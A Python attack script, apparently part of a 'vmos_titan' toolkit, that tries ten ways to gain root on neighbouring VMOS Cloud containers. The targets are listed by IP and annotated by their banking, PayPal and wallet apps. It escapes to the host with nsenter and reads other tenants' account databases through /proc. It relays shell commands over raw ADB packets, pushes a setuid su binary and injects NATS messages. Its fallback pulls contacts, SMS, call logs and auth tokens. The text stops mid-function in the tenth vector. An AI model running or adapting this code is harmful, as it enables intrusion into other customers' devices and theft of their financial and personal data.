#!/usr/bin/env python3
"""
Neighbor Root Escalation — Comprehensive Multi-Vector Test
Tests EVERY known method to gain root on VMOS Cloud neighbor containers.

Vectors:
  V1: nsenter host → find neighbor container PIDs → /proc/<pid>/root/ filesystem access
  V2: switchRoot API → if we discover neighbor pad codes, call VMOS API to enable root
  V3: xu_daemon exploitation → probe xu_daemon HTTP/binder on neighbor containers
  V4: Push su binary → copy su from our root device to neighbor via ADB
  V5: ADB root: service → send "root:" protocol to make adbd restart as root
  V6: armcloud agent port 8779 → probe management agent for root-enable endpoint
  V7: NATS injection → send root command via cloud NATS message bus
  V8: setprop via content provider → try to flip ro.secure=0 via accessible interfaces
  V9: bu backup / content provider data extraction (no-root fallback)
  V10: Direct /proc/PID/root cross-container filesystem (if nsenter works)

Launchpad: APP6476KYH9KMLU5 (Samsung S25 Ultra, root, 10.12.11.186)
Target: top high-value neighbors (10.12.21.175, 10.12.27.39, 10.12.36.76, 10.12.31.245)
"""

import asyncio
import struct
import base64
import json
import time
import os
from datetime import datetime
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════════════════

LAUNCHPAD = "APP6476KYH9KMLU5"
AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
BASE = "https://api.vmoscloud.com"

# Top targets from prior scanning
TARGETS = [
    "10.12.21.175",  # SM-S9110 (Samsung S25), niceproxy.io UK/Virgin Media, 2 Gmail
    "10.12.27.39",   # Pixel 4, dataimpulse residential proxy, wallet apps, 2 Google accounts
    "10.12.36.76",   # SM-A225F, Trade Republic banking app
    "10.12.31.245",  # SM-S9010, PayPal
]

CLONE_DIR = "/data/local/tmp/clone"
RESULTS = {"ts": datetime.now().isoformat(), "vectors": {}, "discovered_pad_codes": []}


# ═══════════════════════════════════════════════════════════════════════════
# ADB Binary Protocol
# ═══════════════════════════════════════════════════════════════════════════

def build_cnxn() -> bytes:
    payload = b"host::\x00"
    cmd = 0x4e584e43
    checksum = sum(payload) & 0xffffffff
    magic = cmd ^ 0xffffffff
    header = struct.pack('<6I', cmd, 0x01000000, 256 * 1024, len(payload), checksum, magic & 0xffffffff)
    return header + payload

def build_open(local_id: int, service: str) -> bytes:
    payload = (service + "\x00").encode()
    cmd = 0x4e45504f
    checksum = sum(payload) & 0xffffffff
    magic = cmd ^ 0xffffffff
    header = struct.pack('<6I', cmd, local_id, 0, len(payload), checksum, magic & 0xffffffff)
    return header + payload


# ═══════════════════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════════════════

async def cmd(client, command, pad=LAUNCHPAD, timeout=30):
    """Execute sync command on launchpad."""
    try:
        r = await client.sync_cmd(pad, command, timeout_sec=timeout)
        data = r.get("data", [{}])
        if isinstance(data, list) and data:
            return data[0].get("errorMsg", "") or ""
        return str(data) if data else ""
    except Exception as e:
        return f"ERROR: {e}"

async def acmd(client, command, pad=LAUNCHPAD):
    """Fire-and-forget async command."""
    return await client.async_adb_cmd([pad], command)

async def relay_cmd(client, target_ip, shell_cmd, timeout_secs=8):
    """Execute command on neighbor via ADB relay from launchpad.
    Uses nc + ADB protocol to relay shell commands to neighbor's port 5555."""
    # Build the probe that sends CNXN then OPEN with shell command
    escaped_cmd = shell_cmd.replace("'", "'\\''")
    relay = (
        f"{{ cat {CLONE_DIR}/cn.bin; sleep 0.3; "
        f"printf 'OPEN\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00'; "
        f"echo -ne 'shell:{escaped_cmd}\\x00' | "
        f"{{ head -c 24 /dev/zero; cat; }}; "  # crude - we'll use the pre-built binary approach
        f"sleep {timeout_secs}; }} | timeout {timeout_secs + 4} nc {target_ip} 5555 2>/dev/null | "
        f"strings"
    )
    # Actually, use the proven probe mechanism: push a script, fire via async
    return await cmd(client, relay, timeout=timeout_secs + 6)

async def probe_neighbor(client, target_ip, shell_cmd, timeout_secs=8):
    """Probe neighbor using on-device nc + ADB protocol.
    Builds CNXN + OPEN packets on-the-fly using printf."""
    # Use the pre-built cn.bin (CNXN packet) already on device
    # Build OPEN packet dynamically for the specific command
    open_pkt = build_open(1, f"shell:{shell_cmd}")
    open_b64 = base64.b64encode(open_pkt).decode()

    probe_script = (
        f"echo '{open_b64}' | base64 -d > {CLONE_DIR}/tmp_op.bin && "
        f"{{ cat {CLONE_DIR}/cn.bin; sleep 0.3; cat {CLONE_DIR}/tmp_op.bin; sleep {timeout_secs}; }} | "
        f"timeout {timeout_secs + 3} nc {target_ip} 5555 2>/dev/null > {CLONE_DIR}/tmp_resp.bin && "
        f"strings {CLONE_DIR}/tmp_resp.bin"
    )
    result = await cmd(client, probe_script, timeout=min(timeout_secs + 8, 30))
    return result or ""


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

def safe(s, maxlen=300):
    """Safe string truncation for logging."""
    s = s or ""
    return s[:maxlen]


# ═══════════════════════════════════════════════════════════════════════════
# VECTOR 1: nsenter Host → Container Discovery + Cross-Container FS Access
# ═══════════════════════════════════════════════════════════════════════════

async def v1_nsenter_host(client):
    """Use nsenter from our rooted container to access host namespace.
    Find neighbor container PIDs, pad codes, and access their /data/ via /proc."""
    log("═" * 60)
    log("VECTOR 1: nsenter Host → Container Discovery")
    log("═" * 60)
    results = {"status": "TESTING"}

    # 1a: Test nsenter to host PID 1
    log("  [1a] Testing nsenter to host...")
    ns_test = await cmd(client,
        "nsenter -t 1 -m -u -i -n -p -- echo HOST_OK 2>&1 || "
        "nsenter -t 1 -m -u -i -n -- echo HOST_PARTIAL 2>&1 || "
        "nsenter -t 1 -m -- echo HOST_MOUNT_ONLY 2>&1 || "
        "echo NSENTER_FAILED", timeout=15)
    log(f"    nsenter result: {ns_test.strip()[:200]}")
    results["nsenter_test"] = ns_test.strip()

    if "HOST_OK" in ns_test or "HOST_PARTIAL" in ns_test or "HOST_MOUNT_ONLY" in ns_test:
        results["status"] = "NSENTER_WORKS"

        # 1b: Find ALL container PIDs with pad_code in environment
        # Use a simpler/faster scan that fits in sync_cmd timeout
        log("  [1b] Scanning host /proc for container PIDs...")
        ns_flags = "-t 1 -m -u -i -n -p" if "HOST_OK" in ns_test else "-t 1 -m -u -i -n" if "HOST_PARTIAL" in ns_test else "-t 1 -m"
        
        # Push scan script to device first, then run it
        scan_script = (
            f"cat > {CLONE_DIR}/host_scan.sh << 'SCANEOF'\n"
            "#!/system/bin/sh\n"
            "for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | head -300); do\n"
            "  env=$(cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n' | grep -i pad_code 2>/dev/null)\n"
            "  if [ -n \"$env\" ]; then\n"
            "    comm=$(cat /proc/$pid/comm 2>/dev/null)\n"
            "    echo \"PID:$pid COMM:$comm $env\"\n"
            "  fi\n"
            "done\n"
            "SCANEOF\n"
            f"chmod +x {CLONE_DIR}/host_scan.sh"
        )
        await cmd(client, scan_script, timeout=10)
        
        container_scan = await cmd(client, (
            f"nsenter {ns_flags} -- sh {CLONE_DIR}/host_scan.sh 2>/dev/null"
        ), timeout=30)
        container_scan = container_scan or ""
        log(f"    Found containers:\n{container_scan[:500]}")
        results["container_pids"] = container_scan

        # Parse discovered pad codes
        for line in container_scan.split("\n"):
            if "pad_code=" in line.lower():
                import re
                pad_match = re.search(r"pad_code=(\w+)", line, re.IGNORECASE)
                pid_match = re.search(r"PID:(\d+)", line)
                if pad_match and pid_match:
                    entry = {
                        "pid": pid_match.group(1),
                        "pad_code": pad_match.group(1),
                        "line": line.strip()
                    }
                    RESULTS["discovered_pad_codes"].append(entry)
                    log(f"    ★ DISCOVERED: PID={entry['pid']} PAD={entry['pad_code']}")

        # 1c: For each discovered container PID, access /proc/<pid>/root/
        if RESULTS["discovered_pad_codes"]:
            for entry in RESULTS["discovered_pad_codes"][:5]:
                pid = entry["pid"]
                log(f"  [1c] Probing PID {pid} ({entry['pad_code']}) filesystem...")
                
                fs_probe = await cmd(client, (
                    f'nsenter {ns_flags} -- sh -c "'
                    f'echo APPS:; ls /proc/{pid}/root/data/data/ 2>/dev/null | head -20; '
                    f'echo ACCOUNTS:; strings /proc/{pid}/root/data/system_ce/0/accounts_ce.db 2>/dev/null | grep -i gmail | head -5; '
                    f'echo PROPS:; strings /proc/{pid}/root/data/property/persistent_properties 2>/dev/null | grep -E \\"proxy|model|brand\\" | head -10; '
                    f'echo DONE"'
                ), timeout=20)
                log(f"    FS probe: {fs_probe[:300]}")
                entry["fs_probe"] = fs_probe

        # 1d: Try to access data_mirror (host-level overlay)
        log("  [1d] Checking data_mirror/host overlays...")
        mirror = await cmd(client,
            f'nsenter {ns_flags} -- sh -c "'
            'ls -la /data_mirror/ 2>/dev/null | head -10; echo ---; '
            'ls /data_mirror/data_ce/ 2>/dev/null | head -10; echo ---; '
            'ls /data_mirror/data_de/ 2>/dev/null | head -10"',
            timeout=15)
        log(f"    data_mirror: {mirror[:200]}")
        results["data_mirror"] = mirror

    else:
        log("    ✗ nsenter FAILED — no host access from this container")
        results["status"] = "FAILED"

    RESULTS["vectors"]["v1_nsenter"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# VECTOR 2: switchRoot API with Discovered Pad Codes
# ═══════════════════════════════════════════════════════════════════════════

async def v2_switch_root_api(client):
    """If V1 discovered neighbor pad codes, call switchRoot API to enable root."""
    log("═" * 60)
    log("VECTOR 2: switchRoot API on Discovered Pad Codes")
    log("═" * 60)
    results = {"status": "TESTING"}

    if not RESULTS["discovered_pad_codes"]:
        log("    ✗ No pad codes discovered (V1 needed first)")
        results["status"] = "NO_PAD_CODES"
        # Try alternative: get our own device env to understand the format
        log("  [2a] Checking our own container environment for pad_code format...")
        our_env = await cmd(client, "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pad|code|auth|token' | head -10", timeout=10)
        log(f"    Our env: {our_env[:300]}")
        results["our_env"] = our_env

    else:
        for entry in RESULTS["discovered_pad_codes"][:3]:
            pad = entry["pad_code"]
            if pad == LAUNCHPAD:
                continue
            log(f"  [2b] Calling switchRoot(enable=True) on {pad}...")
            try:
                r = await client.switch_root([pad], enable=True)
                log(f"    Result: code={r.get('code')} msg={r.get('msg', '')[:100]}")
                entry["switch_root_result"] = r
                
                if r.get("code") == 200:
                    log(f"    ★★★ ROOT ENABLED on {pad}! ★★★")
                    results["status"] = "SUCCESS"
                    
                    # Verify root by probing the neighbor
                    await asyncio.sleep(3)
                    # Check if the pad code matches any of our target IPs
                    log(f"    Verifying root on neighbor containers after switchRoot...")
            except Exception as e:
                log(f"    Error: {e}")
                entry["switch_root_error"] = str(e)

    RESULTS["vectors"]["v2_switch_root"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# VECTOR 3: xu_daemon Exploitation on Neighbors
# ═══════════════════════════════════════════════════════════════════════════

async def v3_xu_daemon(client):
    """Probe xu_daemon on neighbor containers — HTTP API, binder, binary."""
    log("═" * 60)
    log("VECTOR 3: xu_daemon Exploitation on Neighbors")
    log("═" * 60)
    results = {"status": "TESTING", "targets": {}}

    # 3a: Check xu_daemon on our own device first
    log("  [3a] Our xu_daemon analysis...")
    xu_info = await cmd(client, (
        "ps -A | grep xu_daemon; echo ---; "
        "pidof xu_daemon; echo ---; "
        "ls -la /proc/$(pidof xu_daemon)/fd/ 2>/dev/null | head -15; echo ---; "
        "ss -tlnp 2>/dev/null | head -15; echo ---; "
        "service list 2>/dev/null | grep -i xu; echo ---; "
        "strings /system/bin/xu_daemon 2>/dev/null | grep -iE 'http|port|listen|socket|19090|root|enable|switch' | head -20"
    ), timeout=20)
    log(f"    xu_daemon info:\n{xu_info[:500]}")
    results["our_xu_daemon"] = xu_info

    # 3b: Check if xu_daemon has a binder service we can call
    log("  [3b] xu_daemon binder service...")
    binder_test = await cmd(client, (
        "service list 2>/dev/null | grep -iE 'xu|root|switch|daemon' | head -10; echo ---; "
        "service call xu 0 2>&1 | head -3; echo ---; "
        "service call xu 1 s16 'id' 2>&1 | head -3; echo ---; "
        "service call xu 1 s16 'getprop ro.secure' 2>&1 | head -3"
    ), timeout=15)
    log(f"    Binder: {binder_test[:300]}")
    results["binder_test"] = binder_test

    # 3c: Check xu_daemon HTTP port on our device
    log("  [3c] xu_daemon HTTP ports on localhost...")
    http_test = await cmd(client, (
        "for p in 19090 36351 52220 52253 57891 8080 9090; do "
        "  r=$(curl -s -m1 http://127.0.0.1:$p/ 2>/dev/null | head -c 100); "
        "  [ -n \"$r\" ] && echo \"PORT:$p RESP:$r\"; "
        "done; echo DONE"
    ), timeout=20)
    log(f"    HTTP ports: {http_test[:300]}")
    results["local_http"] = http_test

    # 3d: Probe xu_daemon ports on each neighbor
    for target in TARGETS[:2]:
        log(f"  [3d] Probing xu_daemon ports on {target}...")
        target_results = {}

        port_scan = await probe_neighbor(client, target, (
            "ss -tlnp 2>/dev/null; echo ---; "
            "ps -A | grep -E 'xu_daemon|cloudservice|adbd' 2>/dev/null; echo ---; "
            "for p in 19090 8779 36351 52220; do "
            "  nc -w1 -z 127.0.0.1 $p 2>&1 && echo PORT:$p:OPEN || echo PORT:$p:CLOSED; "
            "done"
        ), timeout_secs=10)
        log(f"    {target} ports: {port_scan[:300]}")
        target_results["ports"] = port_scan

        # 3e: Try calling xu_daemon binder on neighbor
        log(f"  [3e] xu_daemon binder on {target}...")
        binder_probe = await probe_neighbor(client, target, (
            "service list 2>/dev/null | grep -iE 'xu|root' | head -5; echo ---; "
            "service call xu 0 2>&1 | head -3; echo ---; "
            "service call xu 1 s16 'id' 2>&1 | head -3"
        ), timeout_secs=10)
        log(f"    Binder: {binder_probe[:200]}")
        target_results["binder"] = binder_probe

        results["targets"][target] = target_results

    RESULTS["vectors"]["v3_xu_daemon"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# VECTOR 4: Push su Binary to Neighbor
# ═══════════════════════════════════════════════════════════════════════════

async def v4_push_su_binary(client):
    """Copy su binary from our root device and push to neighbor."""
    log("═" * 60)
    log("VECTOR 4: Push su Binary to Neighbor")
    log("═" * 60)
    results = {"status": "TESTING", "targets": {}}

    # 4a: Find and prepare our su binary
    log("  [4a] Finding su binary on our device...")
    su_find = await cmd(client, (
        "which su 2>/dev/null; echo ---; "
        "ls -la $(which su) 2>/dev/null; echo ---; "
        "file $(which su) 2>/dev/null; echo ---; "
        "find / -name su -type f 2>/dev/null | head -10; echo ---; "
        "find / -name 'su' -o -name 'busybox' -o -name 'magisk' 2>/dev/null | head -10"
    ), timeout=15)
    log(f"    su binary: {su_find[:300]}")
    results["su_location"] = su_find

    # 4b: Copy su to staging area and base64 encode it
    log("  [4b] Preparing su binary for transfer...")
    su_prep = await cmd(client, (
        "SU=$(which su 2>/dev/null || echo /system/xbin/su); "
        "cp $SU /data/local/tmp/clone/su_copy 2>/dev/null; "
        "chmod 6755 /data/local/tmp/clone/su_copy 2>/dev/null; "
        "ls -la /data/local/tmp/clone/su_copy 2>/dev/null; echo ---; "
        "md5sum /data/local/tmp/clone/su_copy 2>/dev/null; echo ---; "
        "wc -c /data/local/tmp/clone/su_copy 2>/dev/null"
    ), timeout=15)
    log(f"    su prep: {su_prep[:200]}")
    results["su_prep"] = su_prep

    # 4c: Base64 encode su binary (we'll need to push it in chunks)
    log("  [4c] Encoding su binary...")
    su_b64_size = await cmd(client, (
        "base64 /data/local/tmp/clone/su_copy 2>/dev/null | wc -c"
    ), timeout=10)
    log(f"    su base64 size: {su_b64_size.strip()} bytes")
    results["su_b64_size"] = su_b64_size.strip()

    # 4d: For each target, push su via ADB protocol
    for target in TARGETS[:2]:
        log(f"  [4d] Attempting su push to {target}...")
        target_results = {}

        # Method 1: Write su binary via echo+base64 (small chunks)
        # First check if /data/local/tmp is writable
        writable_check = await probe_neighbor(client, target,
            "mkdir -p /data/local/tmp/root_test && echo WRITABLE || echo NOT_WRITABLE",
            timeout_secs=8)
        log(f"    Writable: {writable_check[:100]}")
        target_results["writable"] = writable_check

        if "WRITABLE" in writable_check:
            # Push su in chunks via ADB shell echo+base64
            log(f"    Pushing su binary to {target} via ADB relay...")
            # Get first chunk of su binary
            chunk = await cmd(client,
                "base64 /data/local/tmp/clone/su_copy 2>/dev/null | head -c 2000",
                timeout=10)
            
            if chunk and len(chunk) > 100:
                # Write first chunk to neighbor
                push_result = await probe_neighbor(client, target,
                    f"echo '{chunk[:1000]}' | base64 -d > /data/local/tmp/root_test/su 2>&1; "
                    f"chmod 6755 /data/local/tmp/root_test/su 2>&1; "
                    f"ls -la /data/local/tmp/root_test/su 2>&1; "
                    f"/data/local/tmp/root_test/su -c id 2>&1; "
                    f"echo PUSH_TEST_DONE",
                    timeout_secs=10)
                log(f"    Push result: {push_result[:200]}")
                target_results["push_result"] = push_result

                # Try running the su binary
                if "PUSH_TEST" in push_result:
                    su_test = await probe_neighbor(client, target,
                        "/data/local/tmp/root_test/su -c 'id; whoami' 2>&1 || "
                        "/data/local/tmp/root_test/su id 2>&1 || "
                        "echo SU_FAILED",
                        timeout_secs=8)
                    log(f"    su test: {su_test[:200]}")
                    target_results["su_test"] = su_test
                    if "uid=0" in su_test:
                        log(f"    ★★★ ROOT VIA SU PUSH on {target}! ★★★")
                        results["status"] = "SUCCESS"

        results["targets"][target] = target_results

    RESULTS["vectors"]["v4_su_push"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# VECTOR 5: ADB root: Service Protocol
# ═══════════════════════════════════════════════════════════════════════════

async def v5_adb_root_service(client):
    """Send 'root:' ADB service to neighbor to restart adbd as uid=0."""
    log("═" * 60)
    log("VECTOR 5: ADB root: Service Protocol")
    log("═" * 60)
    results = {"status": "TESTING", "targets": {}}

    for target in TARGETS[:2]:
        log(f"  [5a] Sending root: service to {target}...")
        
        # Build OPEN packet with "root:" service
        root_pkt = build_open(1, "root:")
        root_b64 = base64.b64encode(root_pkt).decode()

        root_result = await cmd(client, (
            f"echo '{root_b64}' | base64 -d > {CLONE_DIR}/root_svc.bin && "
            f"{{ cat {CLONE_DIR}/cn.bin; sleep 0.3; cat {CLONE_DIR}/root_svc.bin; sleep 3; }} | "
            f"timeout 8 nc {target} 5555 2>/dev/null > {CLONE_DIR}/root_resp.bin && "
            f"strings {CLONE_DIR}/root_resp.bin; echo ---; "
            f"xxd {CLONE_DIR}/root_resp.bin | head -10"
        ), timeout=20)
        log(f"    root: response: {root_result[:300]}")
        results["targets"][target] = {"root_service": root_result}

        # Check if adbd restarted as root
        await asyncio.sleep(2)
        verify = await probe_neighbor(client, target, "id; whoami; getprop ro.secure", timeout_secs=8)
        log(f"    Verify after root: {verify[:200]}")
        results["targets"][target]["verify"] = verify
        if "uid=0" in verify:
            log(f"    ★★★ ADB ROOT SERVICE WORKED on {target}! ★★★")
            results["status"] = "SUCCESS"

    RESULTS["vectors"]["v5_adb_root"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# VECTOR 6: armcloud Agent Port 8779
# ═══════════════════════════════════════════════════════════════════════════

async def v6_armcloud_agent(client):
    """Probe armcloud management agent on port 8779 for root-enable endpoints."""
    log("═" * 60)
    log("VECTOR 6: armcloud Agent (port 8779)")
    log("═" * 60)
    results = {"status": "TESTING"}

    # 6a: Probe our own armcloud agent first
    log("  [6a] Our armcloud agent...")
    agent = await cmd(client, (
        "curl -s -m3 http://127.0.0.1:8779/ 2>/dev/null | head -c 200; echo ---; "
        "curl -s -m3 http://127.0.0.1:8779/api 2>/dev/null | head -c 200; echo ---; "
        "curl -s -m3 http://127.0.0.1:8779/health 2>/dev/null | head -c 200; echo ---; "
        "curl -s -m3 http://127.0.0.1:8779/config 2>/dev/null | head -c 200; echo ---; "
        "curl -s -m3 http://127.0.0.1:8779/device 2>/dev/null | head -c 200; echo ---; "
        "curl -s -m3 http://127.0.0.1:8779/cmd 2>/dev/null | head -c 200"
    ), timeout=25)
    log(f"    Agent: {agent[:400]}")
    results["our_agent"] = agent

    # 6b: Probe agent strings for API endpoints
    log("  [6b] Agent binary strings...")
    agent_strings = await cmd(client, (
        "PID=$(pidof m 2>/dev/null || ss -tlnp | grep 8779 | grep -o 'pid=[0-9]*' | cut -d= -f2 | head -1); "
        "strings /proc/$PID/exe 2>/dev/null | grep -iE '(root|switch|enable|cmd|exec|shell|config|api|device|pad)' | sort -u | head -30"
    ), timeout=15)
    log(f"    Agent strings: {agent_strings[:400]}")
    results["agent_strings"] = agent_strings

    # 6c: Try POST with root-enabling payloads
    log("  [6c] Testing root-enable POST payloads...")
    post_tests = await cmd(client, (
        'curl -s -m3 -X POST -H "Content-Type: application/json" -d \'{"rootEnable":true}\' http://127.0.0.1:8779/api 2>/dev/null; echo ---; '
        'curl -s -m3 -X POST -H "Content-Type: application/json" -d \'{"cmd":"switchRoot","enable":true}\' http://127.0.0.1:8779/cmd 2>/dev/null; echo ---; '
        'curl -s -m3 -X POST -H "Content-Type: application/json" -d \'{"action":"root"}\' http://127.0.0.1:8779/device 2>/dev/null; echo ---; '
        'curl -s -m3 -X POST -H "Content-Type: application/json" -d \'{"type":"switchRoot","data":{"rootEnable":true}}\' http://127.0.0.1:8779/ 2>/dev/null'
    ), timeout=20)
    log(f"    POST tests: {post_tests[:300]}")
    results["post_tests"] = post_tests

    # 6d: Check if port 8779 is reachable on neighbors (cross-network)
    for target in TARGETS[:2]:
        log(f"  [6d] Checking 8779 on {target}...")
        port_check = await cmd(client,
            f"nc -w2 -z {target} 8779 2>&1 && echo OPEN || echo CLOSED",
            timeout=10)
        log(f"    {target}:8779 = {port_check.strip()}")
        results[f"{target}_8779"] = port_check.strip()

        if "OPEN" in port_check:
            log(f"    ★ Port 8779 OPEN on {target}! Probing...")
            remote_agent = await cmd(client, (
                f"curl -s -m3 http://{target}:8779/ 2>/dev/null | head -c 200; echo ---; "
                f"curl -s -m3 -X POST -H 'Content-Type: application/json' "
                f"-d '{{\"rootEnable\":true}}' http://{target}:8779/api 2>/dev/null | head -c 200"
            ), timeout=15)
            log(f"    Remote agent: {remote_agent[:200]}")
            results[f"{target}_agent_response"] = remote_agent

    RESULTS["vectors"]["v6_armcloud"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# VECTOR 7: NATS Injection → Root Command
# ═══════════════════════════════════════════════════════════════════════════

async def v7_nats_injection(client):
    """Inject root-enable command via NATS message bus."""
    log("═" * 60)
    log("VECTOR 7: NATS Message Bus Injection")
    log("═" * 60)
    results = {"status": "TESTING"}

    # 7a: Check NATS connectivity
    log("  [7a] NATS connectivity check...")
    nats_check = await cmd(client, (
        "printf 'PING\\r\\n' | nc -w3 192.168.200.51 4222 2>/dev/null; echo ---; "
        "printf 'INFO\\r\\n' | nc -w3 192.168.200.51 4222 2>/dev/null | head -3; echo ---; "
        "printf 'CONNECT {}\\r\\nPING\\r\\n' | nc -w3 192.168.200.51 4222 2>/dev/null | head -3"
    ), timeout=15)
    log(f"    NATS: {nats_check[:300]}")
    results["nats_info"] = nats_check

    if "PONG" in nats_check or "INFO" in nats_check or "server_id" in nats_check:
        results["nats_reachable"] = True
        
        # 7b: Subscribe to wildcard to see what topics exist
        log("  [7b] NATS wildcard subscribe (3s listen)...")
        nats_sub = await cmd(client, (
            "printf 'CONNECT {}\\r\\nSUB > 1\\r\\nPING\\r\\n' | "
            "timeout 5 nc 192.168.200.51 4222 2>/dev/null | head -20"
        ), timeout=12)
        log(f"    Topics: {nats_sub[:300]}")
        results["nats_topics"] = nats_sub

        # 7c: Try publishing root-enable message on likely topics
        log("  [7c] Publishing root-enable messages...")
        for topic in ["device.root", "pad.switchRoot", "armcloud.cmd", "device.config"]:
            msg = json.dumps({"padCode": TARGETS[0], "rootEnable": True})
            pub_result = await cmd(client, (
                f"printf 'CONNECT {{}}\\r\\nPUB {topic} {len(msg)}\\r\\n{msg}\\r\\nPING\\r\\n' | "
                f"timeout 3 nc 192.168.200.51 4222 2>/dev/null | head -5"
            ), timeout=8)
            if "PONG" in pub_result or "+OK" in pub_result:
                log(f"    Published to {topic}: {pub_result[:80]}")
        
        # 7d: Monitor rtcgesture NATS connections
        log("  [7d] rtcgesture NATS subscriptions...")
        rtc_nats = await cmd(client, (
            "ss -tnp 2>/dev/null | grep 4222; echo ---; "
            "ps -A | grep rtcgesture; echo ---; "
            "cat /proc/$(pidof rtcgesture)/fd/ 2>/dev/null | head -5"
        ), timeout=10)
        log(f"    rtcgesture: {rtc_nats[:200]}")
        results["rtcgesture"] = rtc_nats
    else:
        results["nats_reachable"] = False
        log("    ✗ NATS not reachable")

    RESULTS["vectors"]["v7_nats"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# VECTOR 8: Property Manipulation via accessible interfaces
# ═══════════════════════════════════════════════════════════════════════════

async def v8_property_manipulation(client):
    """Try to change ro.secure, ro.debuggable on neighbors via various paths."""
    log("═" * 60)
    log("VECTOR 8: Property Manipulation on Neighbors")
    log("═" * 60)
    results = {"status": "TESTING", "targets": {}}

    for target in TARGETS[:2]:
        log(f"  [8a] Testing property manipulation on {target}...")
        target_results = {}

        # Try setprop (usually fails as shell user)
        prop_test = await probe_neighbor(client, target, (
            "id; echo ---; "
            "setprop ro.secure 0 2>&1; echo ---; "
            "setprop ro.debuggable 1 2>&1; echo ---; "
            "setprop service.adb.root 1 2>&1; echo ---; "
            "resetprop ro.secure 0 2>&1; echo ---; "
            "resetprop ro.debuggable 1 2>&1; echo ---; "
            "getprop ro.secure; getprop ro.debuggable; getprop service.adb.root"
        ), timeout_secs=10)
        log(f"    Props: {prop_test[:300]}")
        target_results["setprop"] = prop_test

        # Try settings put
        settings_test = await probe_neighbor(client, target, (
            "settings put global adb_enabled 1 2>&1; echo ---; "
            "settings put global development_settings_enabled 1 2>&1; echo ---; "
            "settings get global adb_enabled; echo ---; "
            "settings get global development_settings_enabled"
        ), timeout_secs=8)
        log(f"    Settings: {settings_test[:200]}")
        target_results["settings"] = settings_test

        # Try writing to /data/property/persistent_properties
        persist_test = await probe_neighbor(client, target, (
            "ls -la /data/property/ 2>/dev/null; echo ---; "
            "cat /data/property/persistent_properties 2>/dev/null | strings | grep secure | head -5"
        ), timeout_secs=8)
        log(f"    Persistent props: {persist_test[:200]}")
        target_results["persistent"] = persist_test

        results["targets"][target] = target_results

    RESULTS["vectors"]["v8_props"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# VECTOR 9: No-Root Data Extraction (Fallback)
# ═══════════════════════════════════════════════════════════════════════════

async def v9_noroot_extraction(client):
    """Extract what data we can WITHOUT root — bu backup, content providers, accounts."""
    log("═" * 60)
    log("VECTOR 9: No-Root Data Extraction (Fallback)")
    log("═" * 60)
    results = {"status": "TESTING", "targets": {}}

    for target in TARGETS[:2]:
        log(f"  [9a] No-root extraction from {target}...")
        target_results = {}

        # Method 1: dumpsys account — get account names and types
        accounts = await probe_neighbor(client, target, (
            "dumpsys account 2>/dev/null | grep -E 'Account|name=|type=' | head -30"
        ), timeout_secs=10)
        log(f"    Accounts: {accounts[:300]}")
        target_results["accounts"] = accounts

        # Method 2: Content providers — query accessible ones
        content = await probe_neighbor(client, target, (
            "content query --uri content://com.android.contacts/contacts --projection display_name 2>/dev/null | head -10; echo ---; "
            "content query --uri content://sms 2>/dev/null | head -5; echo ---; "
            "content query --uri content://call_log/calls 2>/dev/null | head -5; echo ---; "
            "content query --uri content://browser/bookmarks 2>/dev/null | head -5"
        ), timeout_secs=12)
        log(f"    Content providers: {content[:300]}")
        target_results["content_providers"] = content

        # Method 3: bu backup — apps with allowBackup=true
        backup_test = await probe_neighbor(client, target, (
            "pm list packages -3 2>/dev/null | head -20; echo ---; "
            "for pkg in com.android.chrome com.google.android.gms; do "
            "  flag=$(dumpsys package $pkg 2>/dev/null | grep 'allowBackup'); "
            "  echo \"$pkg: $flag\"; "
            "done"
        ), timeout_secs=12)
        log(f"    Backup eligibility: {backup_test[:300]}")
        target_results["backup_check"] = backup_test

        # Method 4: Accessible /sdcard data
        sdcard = await probe_neighbor(client, target, (
            "ls -la /sdcard/ 2>/dev/null | head -20; echo ---; "
            "ls -la /sdcard/Download/ 2>/dev/null | head -10; echo ---; "
            "ls -la /sdcard/DCIM/ 2>/dev/null | head -10; echo ---; "
            "find /sdcard -name '*.db' -o -name '*.sqlite' 2>/dev/null | head -10"
        ), timeout_secs=10)
        log(f"    sdcard: {sdcard[:300]}")
        target_results["sdcard"] = sdcard

        # Method 5: cmd account — try token extraction
        tokens = await probe_neighbor(client, target, (
            "cmd account list-accounts 2>/dev/null | head -20; echo ---; "
            "dumpsys account 2>/dev/null | grep -A2 'authTokens' | head -20"
        ), timeout_secs=10)
        log(f"    Tokens: {tokens[:300]}")
        target_results["tokens"] = tokens

        results["targets"][target] = target_results

    RESULTS["vectors"]["v9_noroot"] = results
    return results


# ═══════════════════════════════════════════════════════════════════════════
# VECTOR 10: Host-Level Cross-Container Direct FS Access
# ═══════════════════════════════════════════════════════════════════════════

async def v10_host_cross_container(client):
    """From host namespace, directly mount/access neighbor container filesystems."""
    log("═" * 60)
    log("VECTOR 10: Host-Level Cross-Container Filesystem")
    log("═" * 60)
    results = {"status": "TESTING"}

    # Only viable if V1 showed nsenter works
    v1 = RESULTS["vectors"].get("v1_nsenter", {})
    if v1.get("status") != "NSENTER_WORKS":
        log("    ✗ Skipping — nsenter not available (V1 failed)")
        results["status"] = "SKIPPED"
        RESULTS["vectors"]["v10_host_fs"] = results
        return results

    ns_flags = "-t 1 -m -u -i -n -p"

    # 10a: Enumerate all device-mapper devices on host
    log("  [10a] Host device-mapper enumeration...")
    dm = await cmd(client, (
        f'nsenter {ns_flags} -- sh -c "'
        'dmsetup ls 2>/dev/null; echo ===; '
